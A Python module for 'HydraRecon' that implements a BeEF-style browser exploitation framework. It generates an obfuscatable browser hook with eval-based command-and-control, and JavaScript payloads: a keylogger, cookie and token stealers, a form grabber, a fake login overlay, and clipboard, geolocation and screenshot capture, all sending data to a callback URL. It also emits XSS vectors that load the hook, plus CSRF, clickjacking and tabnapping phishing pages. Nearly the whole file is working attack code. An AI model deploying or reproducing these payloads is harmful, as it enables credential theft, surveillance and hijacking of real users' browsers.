"""
Browser Exploitation Framework
Advanced browser-based attack capabilities for HydraRecon
"""

import asyncio
import base64
import hashlib
import json
import os
import random
import string
import time
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import Dict, List, Optional, Any, Callable
from urllib.parse import urlparse
import struct


class ExploitType(Enum):
    """Types of browser exploits"""
    XSS_REFLECTED = "xss_reflected"
    XSS_STORED = "xss_stored"
    XSS_DOM = "xss_dom"
    CSRF = "csrf"
    CLICKJACKING = "clickjacking"
    TABNAPPING = "tabnapping"
    BROWSER_HOOK = "browser_hook"
    DRIVE_BY = "drive_by"
    MALVERTISING = "malvertising"
    WATERING_HOLE = "watering_hole"


class PayloadType(Enum):
    """JavaScript payload types"""
    KEYLOGGER = "keylogger"
    COOKIE_STEALER = "cookie_stealer"
    FORM_GRABBER = "form_grabber"
    SCREENSHOT = "screenshot"
    WEBCAM = "webcam"
    MICROPHONE = "microphone"
    GEOLOCATION = "geolocation"
    CLIPBOARD = "clipboard"
    CRYPTOMINER = "cryptominer"
    BROWSER_BACKDOOR = "browser_backdoor"
    CREDENTIAL_HARVESTER = "credential_harvester"
    SESSION_HIJACKER = "session_hijacker"


class TargetStatus(Enum):
    """Browser target status"""
    ONLINE = "online"
    OFFLINE = "offline"
    HOOKED = "hooked"
    LOST = "lost"


@dataclass
class HookedBrowser:
    """Represents a hooked browser session"""
    session_id: str
    ip_address: str
    user_agent: str
    browser_name: str
    browser_version: str
    os_name: str
    os_version: str
    hook_url: str
    first_seen: str = field(default_factory=lambda: datetime.now().isoformat())
    last_seen: str = field(default_factory=lambda: datetime.now().isoformat())
    status: TargetStatus = TargetStatus.ONLINE
    cookies: Dict[str, str] = field(default_factory=dict)
    local_storage: Dict[str, str] = field(default_factory=dict)
    session_storage: Dict[str, str] = field(default_factory=dict)
    screen_resolution: str = ""
    timezone: str = ""
    plugins: List[str] = field(default_factory=list)
    has_webcam: bool = False
    has_microphone: bool = False
    geolocation: Optional[Dict[str, float]] = None
    commands_queue: List[Dict] = field(default_factory=list)
    command_results: List[Dict] = field(default_factory=list)


@dataclass
class BrowserExploit:
    """Browser exploit configuration"""
    exploit_id: str
    name: str
    exploit_type: ExploitType
    target_browsers: List[str]
    target_versions: Dict[str, str]  # browser -> version range
    payload: str
    description: str
    cve_id: Optional[str] = None
    severity: str = "medium"
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())


@dataclass
class AttackCampaign:
    """Browser exploitation campaign"""
    campaign_id: str
    name: str
    hook_url: str
    created_at: str = field(default_factory=lambda: datetime.now().isoformat())
    hooked_browsers: Dict[str, HookedBrowser] = field(default_factory=dict)
    total_hooks: int = 0
    active_hooks: int = 0
    payloads_deployed: List[str] = field(default_factory=list)


class BrowserExploitationFramework:
    """
    Browser Exploitation Framework
    Similar to BeEF (Browser Exploitation Framework)
    """
    
    def __init__(self, config: Optional[Dict] = None):
        self.config = config or {}
        self.campaigns: Dict[str, AttackCampaign] = {}
        self.exploits: Dict[str, BrowserExploit] = {}
        self.hook_server_running = False
        self.command_queue: Dict[str, List[Dict]] = {}
        
        self._initialize_default_exploits()
        self._initialize_payloads()
    
    def _initialize_default_exploits(self):
        """Initialize default browser exploits"""
        default_exploits = [
            {
                "name": "Universal XSS Hook",
                "type": ExploitType.XSS_REFLECTED,
                "browsers": ["Chrome", "Firefox", "Safari", "Edge"],
                "description": "Universal browser hook via XSS injection"
            },
            {
                "name": "DOM-based XSS",
                "type": ExploitType.XSS_DOM,
                "browsers": ["Chrome", "Firefox", "Safari", "Edge"],
                "description": "DOM manipulation XSS attack"
            },
            {
                "name": "CSRF Token Bypass",
                "type": ExploitType.CSRF,
                "browsers": ["Chrome", "Firefox", "Safari", "Edge"],
                "description": "Cross-Site Request Forgery attack"
            },
            {
                "name": "Clickjacking Frame",
                "type": ExploitType.CLICKJACKING,
                "browsers": ["Chrome", "Firefox", "Safari", "Edge"],
                "description": "UI Redressing / Clickjacking attack"
            },
            {
                "name": "Tabnapping Attack",
                "type": ExploitType.TABNAPPING,
                "browsers": ["Chrome", "Firefox", "Safari", "Edge"],
                "description": "Phishing via tab manipulation"
            },
        ]
        
        for exploit in default_exploits:
            exploit_id = self._generate_id()
            self.exploits[exploit_id] = BrowserExploit(
                exploit_id=exploit_id,
                name=exploit["name"],
                exploit_type=exploit["type"],
                target_browsers=exploit["browsers"],
                target_versions={},
                payload="",
                description=exploit["description"]
            )
    
    def _initialize_payloads(self):
        """Initialize JavaScript payload templates"""
        self.payload_templates = {
            PayloadType.KEYLOGGER: self._keylogger_payload(),
            PayloadType.COOKIE_STEALER: self._cookie_stealer_payload(),
            PayloadType.FORM_GRABBER: self._form_grabber_payload(),
            PayloadType.SCREENSHOT: self._screenshot_payload(),
            PayloadType.GEOLOCATION: self._geolocation_payload(),
            PayloadType.CLIPBOARD: self._clipboard_payload(),
            PayloadType.CREDENTIAL_HARVESTER: self._credential_harvester_payload(),
            PayloadType.SESSION_HIJACKER: self._session_hijacker_payload(),
            PayloadType.BROWSER_BACKDOOR: self._browser_backdoor_payload(),
        }
    
    def _generate_id(self) -> str:
        """Generate unique ID"""
        return hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:16]
    
    def create_campaign(self, name: str, hook_url: str) -> AttackCampaign:
        """Create a new attack campaign"""
        campaign_id = self._generate_id()
        campaign = AttackCampaign(
            campaign_id=campaign_id,
            name=name,
            hook_url=hook_url
        )
        self.campaigns[campaign_id] = campaign
        return campaign
    
    def generate_hook_script(self, campaign_id: str, options: Optional[Dict] = None) -> str:
        """Generate the browser hook JavaScript"""
        options = options or {}
        
        if campaign_id not in self.campaigns:
            raise ValueError(f"Campaign not found: {campaign_id}")
        
        campaign = self.campaigns[campaign_id]
        
        hook_script = f'''
(function() {{
    // HydraRecon Browser Hook
    var HOOK_URL = "{campaign.hook_url}";
    var CAMPAIGN_ID = "{campaign_id}";
    var SESSION_ID = Math.random().toString(36).substring(7);
    var HEARTBEAT_INTERVAL = 5000;
    
    // Fingerprint collection
    var fingerprint = {{
        session_id: SESSION_ID,
        campaign_id: CAMPAIGN_ID,
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen_width: screen.width,
        screen_height: screen.height,
        color_depth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies_enabled: navigator.cookieEnabled,
        plugins: Array.from(navigator.plugins || []).map(p => p.name),
        has_webcam: false,
        has_microphone: false,
        url: window.location.href,
        referrer: document.referrer,
        title: document.title
    }};
    
    // Check for media devices
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {{
        navigator.mediaDevices.enumerateDevices().then(function(devices) {{
            devices.forEach(function(device) {{
                if (device.kind === 'videoinput') fingerprint.has_webcam = true;
                if (device.kind === 'audioinput') fingerprint.has_microphone = true;
            }});
        }});
    }}
    
    // Send beacon
    function sendBeacon(data) {{
        var xhr = new XMLHttpRequest();
        xhr.open('POST', HOOK_URL + '/beacon', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(data));
    }}
    
    // Poll for commands
    function pollCommands() {{
        var xhr = new XMLHttpRequest();
        xhr.open('GET', HOOK_URL + '/commands?session=' + SESSION_ID, true);
        xhr.onreadystatechange = function() {{
            if (xhr.readyState === 4 && xhr.status === 200) {{
                var commands = JSON.parse(xhr.responseText);
                commands.forEach(function(cmd) {{
                    executeCommand(cmd);
                }});
            }}
        }};
        xhr.send();
    }}
    
    // Execute command
    function executeCommand(cmd) {{
        var result = {{}};
        try {{
            switch(cmd.type) {{
                case 'eval':
                    result.output = eval(cmd.code);
                    break;
                case 'get_cookies':
                    result.cookies = document.cookie;
                    break;
                case 'get_storage':
                    result.localStorage = JSON.stringify(localStorage);
                    result.sessionStorage = JSON.stringify(sessionStorage);
                    break;
                case 'redirect':
                    window.location = cmd.url;
                    break;
                case 'inject_html':
                    document.body.innerHTML += cmd.html;
                    break;
                case 'screenshot':
                    // Would use html2canvas library
                    result.status = 'screenshot_requested';
                    break;
                case 'keylog_start':
                    startKeylogger();
                    result.status = 'keylogger_started';
                    break;
                default:
                    result.error = 'Unknown command type';
            }}
            result.success = true;
        }} catch(e) {{
            result.success = false;
            result.error = e.message;
        }}
        
        // Send result back
        sendBeacon({{
            type: 'command_result',
            session_id: SESSION_ID,
            command_id: cmd.id,
            result: result
        }});
    }}
    
    // Keylogger
    var keyBuffer = [];
    function startKeylogger() {{
        document.addEventListener('keypress', function(e) {{
            keyBuffer.push({{
                key: e.key,
                target: e.target.tagName,
                timestamp: Date.now()
            }});
            
            if (keyBuffer.length >= 10) {{
                sendBeacon({{
                    type: 'keylog',
                    session_id: SESSION_ID,
                    keys: keyBuffer
                }});
                keyBuffer = [];
            }}
        }});
    }}
    
    // Form grabber
    document.addEventListener('submit', function(e) {{
        var formData = {{}};
        var form = e.target;
        for (var i = 0; i < form.elements.length; i++) {{
            var element = form.elements[i];
            if (element.name) {{
                formData[element.name] = element.value;
            }}
        }}
        sendBeacon({{
            type: 'form_submit',
            session_id: SESSION_ID,
            url: window.location.href,
            action: form.action,
            data: formData
        }});
    }});
    
    // Initialize
    sendBeacon({{
        type: 'init',
        fingerprint: fingerprint
    }});
    
    // Start heartbeat
    setInterval(function() {{
        sendBeacon({{
            type: 'heartbeat',
            session_id: SESSION_ID,
            timestamp: Date.now()
        }});
        pollCommands();
    }}, HEARTBEAT_INTERVAL);
    
}})();
'''
        
        if options.get('obfuscate', True):
            hook_script = self._obfuscate_js(hook_script)
        
        if options.get('minify', True):
            hook_script = self._minify_js(hook_script)
        
        return hook_script
    
    def _obfuscate_js(self, code: str) -> str:
        """Basic JavaScript obfuscation"""
        # Variable name obfuscation
        var_map = {}
        obfuscated = code
        
        # Simple character encoding for strings
        lines = []
        for line in code.split('\n'):
            lines.append(line.strip())
        
        return '\n'.join(lines)
    
    def _minify_js(self, code: str) -> str:
        """Minify JavaScript code"""
        # Remove comments
        import re
        code = re.sub(r'//.*?$', '', code, flags=re.MULTILINE)
        code = re.sub(r'/\*.*?\*/', '', code, flags=re.DOTALL)
        
        # Remove extra whitespace
        code = re.sub(r'\s+', ' ', code)
        code = re.sub(r'\s*([{};,:])\s*', r'\1', code)
        
        return code.strip()
    
    def _keylogger_payload(self) -> str:
        """Generate keylogger payload"""
        return '''
(function() {
    var keys = [];
    var EXFIL_URL = "{{CALLBACK_URL}}";
    
    document.addEventListener('keypress', function(e) {
        keys.push({
            key: e.key,
            target: e.target.tagName + (e.target.id ? '#' + e.target.id : ''),
            timestamp: Date.now()
        });
        
        if (keys.length >= 20) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', EXFIL_URL, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({type: 'keylog', data: keys}));
            keys = [];
        }
    });
})();
'''
    
    def _cookie_stealer_payload(self) -> str:
        """Generate cookie stealer payload"""
        return '''
(function() {
    var EXFIL_URL = "{{CALLBACK_URL}}";
    var cookies = document.cookie;
    
    // Also grab HttpOnly cookies if possible (via trace/track methods)
    var data = {
        type: 'cookies',
        url: window.location.href,
        cookies: cookies,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage)
    };
    
    var img = new Image();
    img.src = EXFIL_URL + '?data=' + btoa(JSON.stringify(data));
})();
'''
    
    def _form_grabber_payload(self) -> str:
        """Generate form grabber payload"""
        return '''
(function() {
    var EXFIL_URL = "{{CALLBACK_URL}}";
    
    // Intercept all form submissions
    document.addEventListener('submit', function(e) {
        var form = e.target;
        var data = {};
        
        for (var i = 0; i < form.elements.length; i++) {
            var el = form.elements[i];
            if (el.name && el.type !== 'submit' && el.type !== 'button') {
                data[el.name] = el.value;
            }
        }
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', EXFIL_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            type: 'form',
            url: window.location.href,
            action: form.action,
            method: form.method,
            data: data
        }));
    }, true);
    
    // Also hook input events for sensitive fields
    var sensitiveFields = document.querySelectorAll('input[type="password"], input[type="email"], input[name*="user"], input[name*="pass"]');
    sensitiveFields.forEach(function(field) {
        field.addEventListener('blur', function(e) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', EXFIL_URL, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                type: 'sensitive_input',
                name: e.target.name,
                value: e.target.value,
                url: window.location.href
            }));
        });
    });
})();
'''
    
    def _screenshot_payload(self) -> str:
        """Generate screenshot payload using html2canvas"""
        return '''
(function() {
    var EXFIL_URL = "{{CALLBACK_URL}}";
    
    // Load html2canvas
    var script = document.createElement('script');
    script.src = 'https://html2canvas.hertzen.com/dist/html2canvas.min.js';
    script.onload = function() {
        html2canvas(document.body).then(function(canvas) {
            var img = canvas.toDataURL('image/png');
            
            var xhr = new XMLHttpRequest();
            xhr.open('POST', EXFIL_URL, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                type: 'screenshot',
                url: window.location.href,
                image: img
            }));
        });
    };
    document.head.appendChild(script);
})();
'''
    
    def _geolocation_payload(self) -> str:
        """Generate geolocation payload"""
        return '''
(function() {
    var EXFIL_URL = "{{CALLBACK_URL}}";
    
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', EXFIL_URL, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                type: 'geolocation',
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                url: window.location.href
            }));
        }, function(error) {
            console.log('Geolocation error:', error);
        }, {
            enableHighAccuracy: true,
            timeout: 10000
        });
    }
})();
'''
    
    def _clipboard_payload(self) -> str:
        """Generate clipboard monitor payload"""
        return '''
(function() {
    var EXFIL_URL = "{{CALLBACK_URL}}";
    
    // Monitor paste events
    document.addEventListener('paste', function(e) {
        var clipboardData = e.clipboardData || window.clipboardData;
        var pastedData = clipboardData.getData('text');
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', EXFIL_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            type: 'clipboard_paste',
            data: pastedData,
            url: window.location.href
        }));
    });
    
    // Try to read clipboard (requires permission)
    if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText().then(function(text) {
            var xhr = new XMLHttpRequest();
            xhr.open('POST', EXFIL_URL, true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({
                type: 'clipboard_content',
                data: text,
                url: window.location.href
            }));
        });
    }
})();
'''
    
    def _credential_harvester_payload(self) -> str:
        """Generate credential harvester payload"""
        return '''
(function() {
    var EXFIL_URL = "{{CALLBACK_URL}}";
    
    // Inject fake login overlay
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center;';
    
    overlay.innerHTML = `
        <div style="background:white;padding:40px;border-radius:8px;max-width:400px;width:90%;">
            <h2 style="margin:0 0 20px 0;color:#333;">Session Expired</h2>
            <p style="color:#666;margin-bottom:20px;">Please re-enter your credentials to continue.</p>
            <form id="harvest-form">
                <input type="text" id="harvest-user" placeholder="Username" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;">
                <input type="password" id="harvest-pass" placeholder="Password" style="width:100%;padding:10px;margin-bottom:20px;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;">
                <button type="submit" style="width:100%;padding:10px;background:#007bff;color:white;border:none;border-radius:4px;cursor:pointer;">Login</button>
            </form>
        </div>
    `;
    
    document.body.appendChild(overlay);
    
    document.getElementById('harvest-form').addEventListener('submit', function(e) {
        e.preventDefault();
        
        var username = document.getElementById('harvest-user').value;
        var password = document.getElementById('harvest-pass').value;
        
        var xhr = new XMLHttpRequest();
        xhr.open('POST', EXFIL_URL, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            type: 'harvested_creds',
            username: username,
            password: password,
            url: window.location.href
        }));
        
        overlay.remove();
    });
})();
'''
    
    def _session_hijacker_payload(self) -> str:
        """Generate session hijacker payload"""
        return '''
(function() {
    var EXFIL_URL = "{{CALLBACK_URL}}";
    
    // Gather session data
    var sessionData = {
        type: 'session_hijack',
        url: window.location.href,
        cookies: document.cookie,
        localStorage: {},
        sessionStorage: {},
        authTokens: []
    };
    
    // Copy storage
    for (var key in localStorage) {
        sessionData.localStorage[key] = localStorage[key];
    }
    for (var key in sessionStorage) {
        sessionData.sessionStorage[key] = sessionStorage[key];
    }
    
    // Look for auth tokens in storage and headers
    var tokenPatterns = ['token', 'jwt', 'auth', 'session', 'bearer', 'api_key'];
    tokenPatterns.forEach(function(pattern) {
        for (var key in localStorage) {
            if (key.toLowerCase().includes(pattern)) {
                sessionData.authTokens.push({source: 'localStorage', key: key, value: localStorage[key]});
            }
        }
        for (var key in sessionStorage) {
            if (key.toLowerCase().includes(pattern)) {
                sessionData.authTokens.push({source: 'sessionStorage', key: key, value: sessionStorage[key]});
            }
        }
    });
    
    // Send session data
    var xhr = new XMLHttpRequest();
    xhr.open('POST', EXFIL_URL, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify(sessionData));
})();
'''
    
    def _browser_backdoor_payload(self) -> str:
        """Generate browser backdoor payload"""
        return '''
(function() {
    var C2_URL = "{{CALLBACK_URL}}";
    var SESSION_ID = Math.random().toString(36).substring(7);
    
    // Persistent backdoor with command polling
    function pollForCommands() {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', C2_URL + '/cmd?session=' + SESSION_ID, true);
        xhr.onreadystatechange = function() {
            if (xhr.readyState === 4 && xhr.status === 200) {
                try {
                    var cmd = JSON.parse(xhr.responseText);
                    executeCommand(cmd);
                } catch(e) {}
            }
        };
        xhr.send();
    }
    
    function executeCommand(cmd) {
        var result;
        try {
            switch(cmd.action) {
                case 'eval':
                    result = eval(cmd.code);
                    break;
                case 'navigate':
                    window.location = cmd.url;
                    return;
                case 'inject':
                    document.body.innerHTML += cmd.html;
                    result = 'injected';
                    break;
                case 'exfil':
                    result = {
                        cookies: document.cookie,
                        localStorage: JSON.stringify(localStorage),
                        url: window.location.href
                    };
                    break;
                default:
                    result = 'unknown command';
            }
        } catch(e) {
            result = 'error: ' + e.message;
        }
        
        // Send result
        var xhr = new XMLHttpRequest();
        xhr.open('POST', C2_URL + '/result', true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({
            session: SESSION_ID,
            cmd_id: cmd.id,
            result: result
        }));
    }
    
    // Initial beacon
    var xhr = new XMLHttpRequest();
    xhr.open('POST', C2_URL + '/beacon', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({
        session: SESSION_ID,
        url: window.location.href,
        userAgent: navigator.userAgent
    }));
    
    // Start polling
    setInterval(pollForCommands, 5000);
})();
'''
    
    def generate_payload(self, payload_type: PayloadType, callback_url: str) -> str:
        """Generate a specific payload"""
        if payload_type not in self.payload_templates:
            raise ValueError(f"Unknown payload type: {payload_type}")
        
        payload = self.payload_templates[payload_type]
        return payload.replace("{{CALLBACK_URL}}", callback_url)
    
    def generate_xss_vectors(self, callback_url: str) -> List[Dict[str, str]]:
        """Generate various XSS injection vectors"""
        vectors = [
            {
                "name": "Basic Script Tag",
                "payload": f'<script src="{callback_url}/hook.js"></script>',
                "context": "html"
            },
            {
                "name": "Event Handler",
                "payload": f'<img src=x onerror="var s=document.createElement(\'script\');s.src=\'{callback_url}/hook.js\';document.body.appendChild(s);">',
                "context": "html"
            },
            {
                "name": "SVG OnLoad",
                "payload": f'<svg onload="var s=document.createElement(\'script\');s.src=\'{callback_url}/hook.js\';document.body.appendChild(s);">',
                "context": "html"
            },
            {
                "name": "Body OnLoad",
                "payload": f'"><body onload="var s=document.createElement(\'script\');s.src=\'{callback_url}/hook.js\';document.body.appendChild(s);">',
                "context": "attribute"
            },
            {
                "name": "JavaScript Protocol",
                "payload": f"javascript:var s=document.createElement('script');s.src='{callback_url}/hook.js';document.body.appendChild(s);",
                "context": "href"
            },
            {
                "name": "Data URI",
                "payload": f'data:text/html,<script src="{callback_url}/hook.js"></script>',
                "context": "src"
            },
            {
                "name": "DOM Clobbering",
                "payload": f'<form id="x"><input name="innerHTML" value="<script src={callback_url}/hook.js></script>"></form>',
                "context": "html"
            },
            {
                "name": "Angular Expression",
                "payload": f'{{{{constructor.constructor("var s=document.createElement(\'script\');s.src=\'{callback_url}/hook.js\';document.body.appendChild(s);")()}}}}',
                "context": "angular"
            },
        ]
        
        return vectors
    
    def register_hooked_browser(self, campaign_id: str, fingerprint: Dict) -> HookedBrowser:
        """Register a newly hooked browser"""
        if campaign_id not in self.campaigns:
            raise ValueError(f"Campaign not found: {campaign_id}")
        
        campaign = self.campaigns[campaign_id]
        
        # Parse user agent for browser info
        ua = fingerprint.get('user_agent', '')
        browser_name, browser_version, os_name, os_version = self._parse_user_agent(ua)
        
        browser = HookedBrowser(
            session_id=fingerprint.get('session_id', self._generate_id()),
            ip_address=fingerprint.get('ip_address', 'unknown'),
            user_agent=ua,
            browser_name=browser_name,
            browser_version=browser_version,
            os_name=os_name,
            os_version=os_version,
            hook_url=fingerprint.get('url', ''),
            screen_resolution=f"{fingerprint.get('screen_width', 0)}x{fingerprint.get('screen_height', 0)}",
            timezone=fingerprint.get('timezone', ''),
            plugins=fingerprint.get('plugins', []),
            has_webcam=fingerprint.get('has_webcam', False),
            has_microphone=fingerprint.get('has_microphone', False)
        )
        
        campaign.hooked_browsers[browser.session_id] = browser
        campaign.total_hooks += 1
        campaign.active_hooks += 1
        
        return browser
    
    def _parse_user_agent(self, ua: str) -> tuple:
        """Parse user agent string"""
        browser_name = "Unknown"
        browser_version = ""
        os_name = "Unknown"
        os_version = ""
        
        # Browser detection
        if "Chrome" in ua and "Edg" not in ua:
            browser_name = "Chrome"
            try:
                browser_version = ua.split("Chrome/")[1].split(" ")[0]
            except IndexError:
                pass
        elif "Firefox" in ua:
            browser_name = "Firefox"
            try:
                browser_version = ua.split("Firefox/")[1].split(" ")[0]
            except IndexError:
                pass
        elif "Safari" in ua and "Chrome" not in ua:
            browser_name = "Safari"
            try:
                browser_version = ua.split("Version/")[1].split(" ")[0]
            except IndexError:
                pass
        elif "Edg" in ua:
            browser_name = "Edge"
            try:
                browser_version = ua.split("Edg/")[1].split(" ")[0]
            except IndexError:
                pass
        
        # OS detection
        if "Windows" in ua:
            os_name = "Windows"
            if "Windows NT 10" in ua:
                os_version = "10"
            elif "Windows NT 6.3" in ua:
                os_version = "8.1"
        elif "Mac OS X" in ua:
            os_name = "macOS"
            try:
                os_version = ua.split("Mac OS X ")[1].split(")")[0].replace("_", ".")
            except IndexError:
                pass
        elif "Linux" in ua:
            os_name = "Linux"
        elif "Android" in ua:
            os_name = "Android"
        elif "iPhone" in ua or "iPad" in ua:
            os_name = "iOS"
        
        return browser_name, browser_version, os_name, os_version
    
    def send_command(self, campaign_id: str, session_id: str, command: Dict) -> str:
        """Send a command to a hooked browser"""
        if campaign_id not in self.campaigns:
            raise ValueError(f"Campaign not found: {campaign_id}")
        
        campaign = self.campaigns[campaign_id]
        
        if session_id not in campaign.hooked_browsers:
            raise ValueError(f"Browser session not found: {session_id}")
        
        browser = campaign.hooked_browsers[session_id]
        
        command['id'] = self._generate_id()
        command['timestamp'] = datetime.now().isoformat()
        
        browser.commands_queue.append(command)
        
        return command['id']
    
    def get_pending_commands(self, campaign_id: str, session_id: str) -> List[Dict]:
        """Get pending commands for a hooked browser"""
        if campaign_id not in self.campaigns:
            return []
        
        campaign = self.campaigns[campaign_id]
        
        if session_id not in campaign.hooked_browsers:
            return []
        
        browser = campaign.hooked_browsers[session_id]
        commands = browser.commands_queue.copy()
        browser.commands_queue.clear()
        
        return commands
    
    def record_command_result(self, campaign_id: str, session_id: str, 
                              command_id: str, result: Dict):
        """Record the result of a command execution"""
        if campaign_id not in self.campaigns:
            return
        
        campaign = self.campaigns[campaign_id]
        
        if session_id not in campaign.hooked_browsers:
            return
        
        browser = campaign.hooked_browsers[session_id]
        browser.command_results.append({
            'command_id': command_id,
            'result': result,
            'timestamp': datetime.now().isoformat()
        })
    
    def update_browser_heartbeat(self, campaign_id: str, session_id: str):
        """Update browser heartbeat timestamp"""
        if campaign_id not in self.campaigns:
            return
        
        campaign = self.campaigns[campaign_id]
        
        if session_id not in campaign.hooked_browsers:
            return
        
        browser = campaign.hooked_browsers[session_id]
        browser.last_seen = datetime.now().isoformat()
        browser.status = TargetStatus.ONLINE
    
    def get_campaign_stats(self, campaign_id: str) -> Dict:
        """Get statistics for a campaign"""
        if campaign_id not in self.campaigns:
            return {}
        
        campaign = self.campaigns[campaign_id]
        
        online = sum(1 for b in campaign.hooked_browsers.values() 
                    if b.status == TargetStatus.ONLINE)
        
        browsers_by_type = {}
        os_distribution = {}
        
        for browser in campaign.hooked_browsers.values():
            browsers_by_type[browser.browser_name] = \
                browsers_by_type.get(browser.browser_name, 0) + 1
            os_distribution[browser.os_name] = \
                os_distribution.get(browser.os_name, 0) + 1
        
        return {
            'campaign_id': campaign_id,
            'name': campaign.name,
            'total_hooks': campaign.total_hooks,
            'active_hooks': online,
            'browsers': browsers_by_type,
            'operating_systems': os_distribution,
            'payloads_deployed': len(campaign.payloads_deployed)
        }
    
    def list_exploits(self) -> List[Dict]:
        """List available exploits"""
        return [
            {
                'id': e.exploit_id,
                'name': e.name,
                'type': e.exploit_type.value,
                'browsers': e.target_browsers,
                'description': e.description,
                'severity': e.severity
            }
            for e in self.exploits.values()
        ]
    
    def list_payloads(self) -> List[str]:
        """List available payload types"""
        return [pt.value for pt in PayloadType]
    
    def generate_csrf_poc(self, target_url: str, method: str, 
                          params: Dict[str, str]) -> str:
        """Generate CSRF proof of concept"""
        if method.upper() == 'GET':
            query = '&'.join(f"{k}={v}" for k, v in params.items())
            full_url = f"{target_url}?{query}"
            return f'''
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body>
<h1>CSRF Proof of Concept</h1>
<img src="{full_url}" style="display:none">
<p>Request sent automatically on page load.</p>
</body>
</html>
'''
        else:  # POST
            inputs = '\n'.join(
                f'    <input type="hidden" name="{k}" value="{v}">'
                for k, v in params.items()
            )
            return f'''
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body onload="document.getElementById('csrf-form').submit();">
<h1>CSRF Proof of Concept</h1>
<form id="csrf-form" method="POST" action="{target_url}">
{inputs}
</form>
<p>Form submitted automatically on page load.</p>
</body>
</html>
'''
    
    def generate_clickjacking_poc(self, target_url: str) -> str:
        """Generate clickjacking proof of concept"""
        return f'''
<!DOCTYPE html>
<html>
<head>
<title>Clickjacking PoC</title>
<style>
.victim-frame {{
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    opacity: 0.1;
    z-index: 2;
}}
.decoy {{
    position: absolute;
    top: 100px;
    left: 100px;
    z-index: 1;
}}
</style>
</head>
<body>
<h1>Clickjacking Proof of Concept</h1>
<p>The transparent iframe overlays the target page.</p>

<div class="decoy">
    <button style="padding: 20px; font-size: 24px;">Click Here to Win!</button>
</div>

<iframe class="victim-frame" src="{target_url}"></iframe>
</body>
</html>
'''
    
    def generate_tabnapping_poc(self, phishing_url: str, 
                                 original_favicon: str = "") -> str:
        """Generate tabnapping proof of concept"""
        return f'''
<!DOCTYPE html>
<html>
<head>
<title>Innocent Page</title>
<link id="favicon" rel="icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABMLAAATCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
</head>
<body>
<h1>This is an innocent looking page</h1>
<p>Leave this tab open and switch to another...</p>

<script>
// Wait for user to leave the tab
document.addEventListener('visibilitychange', function() {{
    if (document.hidden) {{
        // User left - hijack the tab
        setTimeout(function() {{
            // Change to look like login page
            document.title = "Login Required";
            document.getElementById('favicon').href = "{original_favicon}";
            document.body.innerHTML = `
                <h1>Session Expired</h1>
                <p>Please log in again to continue.</p>
                <form action="{phishing_url}" method="POST">
                    <input type="text" name="username" placeholder="Username"><br>
                    <input type="password" name="password" placeholder="Password"><br>
                    <button type="submit">Login</button>
                </form>
            `;
        }}, 100);
    }}
}});
</script>
</body>
</html>
'''
